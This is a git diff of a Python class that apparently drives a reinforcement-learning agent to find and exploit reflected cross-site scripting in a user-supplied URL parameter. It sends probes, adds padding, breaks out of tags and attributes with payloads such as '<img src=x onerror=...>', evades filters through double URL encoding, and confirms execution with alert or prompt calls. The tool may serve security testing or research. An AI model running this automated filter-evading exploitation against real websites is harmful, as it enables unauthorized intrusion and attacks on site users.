@@ -1,36 +1,59 @@
-import sys, getopt, validators, random, string
-import requests
+from bs4 import BeautifulSoup
+import sys, random, string, requests, re
+import utils
+
+
+
+# To add a new action: 
+#  create a new method
+#  add it to the self.actions dictionary in the states where it is allowed
+
+# To add a new state:
+#  add it to the self.states_name_to_location and self.states_location_to_name structures
+#  add it to the self.action structure with its allowed actions
+#  add the implementation in the resetPayload function
+#  add the implementation in the goalCheck function
+#  add the implementation in the goBack function 
 
 class Enviroment:
-    
+
+    # Constructor that initiates the environment
     def __init__(self, argv):
 
         # Check user input
-        self.checkParameters(argv)
+        self.url, self.method, self.parameter = utils.checkParameters(argv)
         
         # Initiliaze xss payload
-        self.js=""
-        self.html=""
-        self.padding=""
-        self.payload=""
+        self.js = ""
+        self.html = ""
+        self.html_padding=""
+        self.padding_sx = ""
+        self.padding_dx = ""
+        self.payload = ""
+        self.validHtml = ""
 
         # Initiliaze xss trigger
-        self.expected_html=""
-        self.expected_js=""
-        self.expected=""
+        self.injection_point = ""
+        self.expected_html = ""
+        self.expected_js = ""
+        self.expected = ""
 
         # States
         self.states_name_to_location = {
             "testReflection":0,
-            "testHtml":1,
-            "testJs":2,
-            "exploited":3
+            "addPadding":1,
+            "findValidHtml":2,
+            "avoidHtmlFilters":3,
+            "avoidJsFilters":4,
+            "exploited":5
         }
         self.states_location_to_name= {
             0:"testReflection",
-            1:"testHtml",
-            2:"testJs",
-            3:"exploited"
+            1:"addPadding",
+            2:"findValidHtml",
+            3:"avoidHtmlFilters",
+            4:"avoidJsFilters",
+            5:"exploited"
         }
         self.n_states = len(self.states_name_to_location)
 
@@ -38,64 +61,31 @@ class Enviroment:
         self.actions = {
             self.states_name_to_location["testReflection"]: {
                 0: self.actionNewTestString,
-                1: self.actionAddRandomChar
             },
-            self.states_name_to_location["testHtml"]:{
+            self.states_name_to_location["addPadding"]: {
+                0: self.actionAddSxRandomChar,
+                1: self.actionAddDxRandomChar
+            },
+            self.states_name_to_location["findValidHtml"]:{
+                0: self.actionInjectionInTag,
+                1: self.actionInjectionInAttribute
+            },
+            self.states_name_to_location["avoidHtmlFilters"]:{
                 0: self.actionNewHtmlPayload,
-                1: self.actionEncode,
-                2: self.actionDubleEncode
+                1: self.actionDubleEncode
             },
-            self.states_name_to_location["testJs"]:{
+            self.states_name_to_location["avoidJsFilters"]:{
                 0: self.actionNewJsPayload
             },
             self.states_name_to_location["exploited"]:{
                 0: self.actionNewTestString
             }
         }
-        count = 0
-        for element in self.actions:
-            count+=len(self.actions[element])
-        self.n_actions = count
 
-    # Check user parameters
-    def checkParameters(self, argv):
-        USAGE="main.py -u <url> [-m <method>] -p <parameter>"
-
-        # Default parameters
-        self.method="GET"
-
-        # Get and check parameters
-        try:
-            opts, args = getopt.getopt(argv,"hu:m:p:",["url=","method=","parameter="])
-        except getopt.GetoptError:
-            print("[!] Usage: {}".format(USAGE))
-            sys.exit(1)
-        for opt, arg in opts:
-            if opt in ("-h", "--help"):
-                print(USAGE)
-                sys.exit()
-            elif opt in ("-u", "--url"):
-                if not validators.url(arg):
-                    print("[!] Url not valid")
-                    sys.exit(1)
-                else:
-                    self.url=arg
-            elif opt in ("-m", "--method"):
-                if arg not in ("GET","POST","COOKIE"):
-                    print("[!] Method not allowed")
-                    sys.exit(1)
-                else:
-                    self.method=arg
-            elif opt in ("-p", "--parameter"):
-                self.parameter=arg
-            
-        # Required parameters
-        if self.url == "":
-            print("[!] Url is required, usage: {}".format(USAGE))
-            sys.exit(1)
-        if self.parameter == "":
-            print("[!] With {} method parameter is required, usage: main.py -u <url> -m {} -p <parameter>".format(self.method, self.method))
-            sys.exit(1)
+    # Return number of actions by state
+    def getNumOfActions(self,state):
+        if state >= 0 and state < len(self.states_name_to_location):
+            return len(self.actions[state])
 
     # CONNECTION TO ENDPOINT
 
@@ -149,91 +139,209 @@ class Enviroment:
         # No exception, so return response
         return response
 
+    # only connect if the html is syntactically valid
+    def connectionIfHtmlValid(self, response):
+        print("Local test: {}".format(response))
+        if len(re.findall("<([^<>]*)>([^<>]*<img src=x onerror={}>[^<>]*)<([^<>]*)>",response)) > 0:
+            return self.connection(self.payload)
+        else:
+            return ""
+
     # Print connection details 
     def connectionDetail(self,):
         return "\nUrl: {}\nMethod: {}\nParameter: {}\nResponse code: {}\n".format(self.url, self.method, self.parameter, self.default_response_code)
 
     # XSS EXPLOITATION
 
-    # Build Xss payload and expected responce
+    # Build XSS payload and expected response
     def buildPayload(self):
-        self.payload = self.padding + str(self.html).replace("{}", self.js, 1)
-        self.expected = str(self.expected_html).replace("{}", self.expected_js, 1)
+        self.payload = self.padding_sx + str(self.html).replace("{}", self.js, 1) + self.padding_dx
+        self.expected = self.html_padding + str(self.expected_html).replace("{}", self.expected_js, 1)
+
+    # Returns the tag into where the random string was injected
+    def getInjectionPoint(self, response):
+        soup = BeautifulSoup(response,features="lxml")
+        for elem in soup(text=re.compile(self.expected)):
+            self.injection_point = str(elem.parent).lower().replace(self.expected.lower(), "{}", 1)
+            break
 
     # Execute action and return reward
     def doAction(self, state, action):
         print("\nState: {}\nAction: {}".format(self.states_location_to_name[state],self.actions[state][action].__name__))
+        
         self.actions[state][action]()
         self.buildPayload()
-        response = self.connection(self.payload)
+
+        # Check if state is locally tested
+        response = ""
+        if state == self.states_name_to_location["findValidHtml"]:
+            response = self.connectionIfHtmlValid(self.injection_point.lower().replace("{}",self.html,1))
+        else:
+            response = self.connection(self.payload)
+        
         return self.goalCheck(state,response)
 
     # Checks if an XSS has been triggered
     def goalCheck(self, state, response):
-        print("Expected: {}\nResponce> {}".format(self.expected.lower(),response.text.lower()))
 
-        # testReflection
+        # DEBUG
+        if response:
+            print("Expected: {}\nResponce> {}".format(self.expected.lower(),response.text.lower()))
+        else: 
+            print("Local test: not valid HTML")
+        # TEST REFLECTION STATE
         if self.states_location_to_name[state] == "testReflection":
             if self.expected.lower() in response.text.lower():
                 print("[passed] payload: {}".format(self.payload))
-                return 1, 100, False
+                self.getInjectionPoint(response.text)
+                return self.states_name_to_location["findValidHtml"], 100, False
             else:
                 print("[filtered] payload: {}".format(self.payload))
-                return 0, 0, False
+                return self.states_name_to_location["addPadding"], -1, False
 
-        # testHtml
-        elif self.states_location_to_name[state] == "testHtml":
+        # ADD PADDING STATE
+        elif self.states_location_to_name[state] == "addPadding":
+            if self.expected.lower() in response.text.lower() and self.payload.lower() not in response.text.lower():
+                print("[passed] payload: {}".format(self.payload))
+                self.getInjectionPoint(response.text)
+                return self.states_name_to_location["findValidHtml"], 100, False
+            elif self.payload.lower() not in response.text.lower():
+                print("[filtered] payload: {}".format(self.payload))
+                return self.states_name_to_location["addPadding"], 10, False
+            else:
+                print("[filtered] payload: {}".format(self.payload))
+                return self.states_name_to_location["addPadding"], -1, False
+
+        # FIND VALID HTML STATE
+        elif self.states_location_to_name[state] == "findValidHtml":
+            self.validHtml = self.html
+            if response != "":
+                if self.expected.lower() in response.text.lower():
+                    print("[passed] payload: {}".format(self.payload))
+                    return self.states_name_to_location["avoidJsFilters"], 100, False
+                else:
+                    print("[passed] payload: {}".format(self.payload))
+                    return self.states_name_to_location["avoidHtmlFilters"], 100, False
+            else:
+                print("[filtered] payload: {}".format(self.payload))
+                return self.states_name_to_location["findValidHtml"], -1, False
+
+        # AVOID HTML FILTERS STATE 
+        elif self.states_location_to_name[state] == "avoidHtmlFilters":
             if self.expected.lower() in response.text.lower():
                 print("[passed] payload: {}".format(self.payload))
-                return 2, 50, False
+                return self.states_name_to_location["avoidJsFilters"], 100, False
             else:
                 print("[filtered] payload: {}".format(self.payload))
-                return 1, 0, False
+                return self.states_name_to_location["avoidHtmlFilters"], -1, False
 
-        # testJs
-        elif self.states_location_to_name[state] == "testJs":
+        # AVOID JS FILTERS STATE 
+        elif self.states_location_to_name[state] == "avoidJsFilters":
             if self.expected.lower() in response.text.lower():
                 print("[passed] payload: {}".format(self.payload))
-                return 3, 100, True
+                return self.states_name_to_location["exploited"], 100, True
             else:
                 print("[filtered] payload: {}".format(self.payload))
-                return 2, 0, False
+                return self.states_name_to_location["avoidJsFilters"], -1, False
+
+    # RESET AND GO BACK FUNCTIONS 
+
+    # Roll back all actions done in this state
+    def resetPayload(self, state):
+
+        # TEST REFLECTION STATE
+        if self.states_location_to_name[state] == "testReflection":
+            self.html=""
+        
+        # ADD PADDING STATE
+        elif self.states_location_to_name[state] == "addPadding":
+            self.padding_dx = ""
+            self.padding_sx = ""
+        
+        # FIND VALID HTML STATE
+        elif self.states_location_to_name[state] == "findValidHtml":
+            self.html = ""
+        
+        # AVOID HTML FILTERS STATE 
+        elif self.states_location_to_name[state] == "avoidHtmlFilters":
+            self.html = self.validHtml
+
+        # AVOID JS FILTERS STATE 
+        elif self.states_location_to_name[state] == "avoidJsFilters":
+            self.js = ""
+
+    # Go to the previous state, return the new state and a boolean indicating whether one has returned to the starting point
+    def goBack(self, state):
+
+        # TEST REFLECTION STATE
+        if self.states_location_to_name[state] == "testReflection":
+            return self.states_name_to_location["testReflection"], True
+        
+        # ADD PADDING STATE
+        elif self.states_location_to_name[state] == "addPadding":
+            return self.states_name_to_location["testReflection"], False
+        
+        # FIND VALID HTML STATE
+        elif self.states_location_to_name[state] == "findValidHtml":
+            return self.states_name_to_location["testReflection"], False
+        
+        # AVOID HTML FILTERS STATE 
+        elif self.states_location_to_name[state] == "avoidHtmlFilters":
+            return self.states_name_to_location["findValidHtml"], False
+
+        # AVOID JS FILTERS STATE 
+        elif self.states_location_to_name[state] == "avoidJsFilters":
+            return self.states_name_to_location["avoidHtmlFilters"], False
 
     # ACTIONS TEST REFLECTION
 
     def actionNewTestString(self):
-        random_string="".join((random.choice(string.ascii_letters) for i in range(10)))
-        self.html=random_string
-        self.expected_html=random_string
+        random_string = "".join((random.choice(string.ascii_letters) for i in range(10)))
+        self.html = random_string
+        self.expected_html = random_string
     
-    def actionAddRandomChar(self):
-        self.padding+="".join(random.choices(string.ascii_letters, k=1))
+    # ACTIONS ADD PADDING
 
-    # ACTIONS TEST HTML
+    def actionAddSxRandomChar(self):
+        self.padding_sx += "".join(random.choices(string.ascii_letters, k=1))
+
+    def actionAddDxRandomChar(self):
+        self.padding_dx += "".join(random.choices(string.ascii_letters, k=1))
+
+    # ACTIONS FIND VALID HTML
+
+    def actionInjectionInTag(self):
+        htmlPayload = "<img src=x onerror={}>"
+        self.html = htmlPayload
+        self.expected_html = htmlPayload
+
+    def actionInjectionInAttribute(self):
+        tag = re.findall("<(\w*)",self.injection_point)
+        if len(tag) > 0:
+            tag = tag[0]
+        else:
+            tag = "p"
+        htmlPayload = "\"><img src=x onerror={}><"+tag+" "
+        self.html = htmlPayload
+        self.expected_html = htmlPayload
+
+    # ACTIONS AVOID HTML FILTERS
 
     def actionNewHtmlPayload(self):
-        htmlPayloads = ["<SCRIPT>{}</SCRIPT>","<img src=javascript:{}>","<img src=x onerror={}>","<input onblur={} autofocus><input autofocus>"]
+        htmlPayloads = ["<SCRIPT>{}</SCRIPT>","<img src=javascript:{}>","<input onblur={} autofocus><input autofocus>"]
         htmlPayload = "".join(random.choices(htmlPayloads, k=1))
         self.html = htmlPayload
         self.expected_html = htmlPayload
-    
-    def actionEncode(self):
-        self.html = self.html.replace("<","%3C")
-        self.html = self.html.replace(">","%3E")
-        self.html = self.html.replace("/","%2F")
-        self.expected_html = self.html.replace("<","%3C")
-        self.expected_html = self.html.replace(">","%3E")
-        self.expected_html = self.html.replace("/","%2F")
+
     
     def actionDubleEncode(self):
-        self.html = self.html.replace("<","%253C")
-        self.html = self.html.replace(">","%253E")
-        self.html = self.html.replace("/","%252F")
-        self.expected_html = self.expected_html.replace("<","%3C")
-        self.expected_html = self.expected_html.replace(">","%3E")
-        self.expected_html = self.expected_html.replace("/","%2F")
+        singleEncoding = {"<":"3C",">":"3E","/":"2F","\\":"5C","\"":"22","'":"27"}
+        doubleEncoding = {"<":"253C",">":"253E","/":"252F","\\":"255C","\"":"2522","'":"2527"}
+        for key in singleEncoding:
+            self.html = self.html.replace(key, "%"+doubleEncoding[key])
+            self.expected_html = self.expected_html.replace(key, "%"+singleEncoding[key])
 
-    # ACTIONS TEST JS
+    # ACTIONS AVOID JS FILTERS
 
     def actionNewJsPayload(self):
         jsPayloads = ["alert(1)","print()","alert(String.fromCharCode(49)","prompt(8)"]
